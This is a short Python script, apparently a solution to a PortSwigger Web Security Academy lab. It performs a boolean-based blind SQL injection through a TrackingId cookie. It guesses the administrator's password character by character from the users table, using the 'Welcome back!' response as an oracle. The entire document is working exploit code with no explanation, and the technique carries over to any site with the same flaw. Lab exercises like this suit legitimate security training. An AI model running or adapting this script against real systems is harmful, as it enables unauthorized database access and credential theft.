import requests
from pwn import *
import time

url = 'https://0ab900f8032f94e982e602ff00230006.web-security-academy.net/'

p1 = log.progress("Ataque de fuerza bruta. Cookie:")

time.sleep(2)

p2 = log.progress("Password")

character_dictionary = string.ascii_lowercase + string.digits


def make_request(url):
    password = ''

    for position in range(1, 21):
        for character in character_dictionary:

            cookies = {
                'TrackingId': "8tKmPzLJy00LiduO' and (select substring(password,%d,1) from users where username='administrator')='%s'-- -" % (position, character),
                'session': 'kHvx6TIRasyDNnP2YQlnYlKoFP66JvtZ'
            }

            p1.status(cookies['TrackingId'])

            response = requests.get(url, cookies=cookies)
            if "Welcome back!" in response.text:
                password += character
                p2.status(password)
                break


if __name__ == '__main__':
    make_request(url)
